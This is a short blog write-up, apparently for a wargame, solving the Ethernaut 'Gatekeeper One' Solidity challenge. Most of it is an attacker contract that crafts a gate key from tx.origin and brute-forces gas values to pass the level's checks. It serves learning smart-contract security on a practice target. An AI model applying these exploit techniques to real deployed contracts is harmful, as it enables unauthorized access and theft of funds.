---
layout: post
title: Ethernaut - 13. Gatekeeperone
date:  2023-08-29
tags: ethernaut solidity
---

## Difficulty : 🌕🌕🌕🌑🌑
> Make it past the gatekeeper and register as an entrant to pass this level. <br /><br />
  Things that might help:
  - Remember what you've learned from the Telephone and Token levels.
  - You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).

## Writeup
1. Get new instance
2. Create a contract
    ``` solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.6.0;

    import './13_GatekeeperOne.sol';

    contract GatekeeperOneAttacker {
        GatekeeperOne gatekeeperone;

        constructor(address _levelInstance) public {
            gatekeeperone = GatekeeperOne(_levelInstance);
        }

        function exploit() external{
            bytes8 _gateKey = bytes8(uint64(tx.origin)) & 0xFFFFFFFF0000FFFF;
            for (uint256 i = 0; i < 300; i++) {
                (bool success, ) = address(gatekeeperone).call.gas(i + (8191 * 3))(abi.encodeWithSignature("enter(bytes8)", _gateKey));
                if (success) {
                    break;
                }
            }
        }
    }
    ```
3. attack
4. `await contract.entrant()`


https://blog.dixitaditya.com/ethernaut-level-13-gatekeeper-one